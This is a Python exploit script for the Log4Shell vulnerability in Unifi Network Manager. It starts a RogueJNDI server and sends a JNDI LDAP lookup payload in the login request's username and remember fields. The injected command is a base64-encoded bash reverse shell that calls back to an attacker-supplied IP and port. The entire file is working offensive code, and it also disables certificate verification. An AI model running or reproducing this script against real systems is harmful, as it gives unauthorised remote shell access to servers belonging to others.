import argparse
import requests
import base64
import subprocess
import time
import os.path
from string import Template

# Dealing with SSL Warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# Defining arguments
def args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="Unifi Network Manager base URL", action='store', required=True)
    parser.add_argument("-i", "--ip", dest="callback", help="Callback IP for payload delivery and reverse shell.", action='store', required=True)
    parser.add_argument("-p", "--port", dest="port", help="Callback port for reverse shell.", action='store', required=True)

    args = parser.parse_args()

    # Making sure RogueJNDI exists on disk
    if os.path.exists('./utils/rogue-jndi/target/RogueJndi-1.1.jar') == True:
        pass 
    else:
        print('[!] You have not compiled RogueJNDI.')
        print('[!] See README.md for more information.')
        exit()

    return args.url, args.callback, args.port
        

def revshell(callback, port, url):

    # Building our URL
    url = f'{url}/api/login'

    # Crafting reverse shell command. 
    shell = base64.b64encode(f'bash -c bash -i >&/dev/tcp/{callback}/{port} 0>&1'.encode('utf-8'))
    revshell = shell.decode('utf-8')

    print('[*] Starting malicous JNDI Server')
    proc = subprocess.Popen(['timeout', '30s', 'java', '-jar', './utils/rogue-jndi/target/RogueJndi-1.1.jar', '--command', f'bash -c {{echo,{revshell}}}|{{base64,-d}}|{{bash,-i}}', '--hostname', f'{callback}'],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)

    # Crafting our payload. Adding in multiple fields as it changes based on version
    t = Template('{"username": "${payload}", "password": "log4j", "remember": "${payload}", "strict":true}')
    payload = t.substitute(payload=f'${{jndi:ldap://{callback}:1389/o=tomcat}}')
    print(payload)

    # Sleeping for seven seconds to prevent issues
    time.sleep(7)

    # Issuing request
    print('[*] Firing payload!')
    response = requests.post(url, data=payload, verify=False)

    print('[*] Check for a callback!')
    
    # Kill RogueJNDI process
    proc.terminate()

url, callback, port = args()
revshell(callback, port, url)
